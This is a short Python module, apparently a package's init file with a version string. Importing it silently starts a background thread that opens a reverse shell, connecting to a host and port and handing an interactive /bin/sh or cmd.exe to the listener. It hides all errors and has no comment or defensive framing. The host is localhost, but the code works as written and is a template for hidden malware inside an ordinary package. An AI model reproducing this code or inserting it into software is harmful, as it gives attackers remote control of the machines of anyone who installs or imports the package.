import socket, subprocess, os, threading

LHOST = "127.0.0.1"
LPORT = 4444

def _pop():
    try:
        s = socket.socket()
        s.connect((LHOST, LPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"] if os.name != "nt" else ["cmd.exe"])
    except Exception:
        pass

threading.Thread(target=_pop, daemon=True).start()

__version__ = "0.1.0"
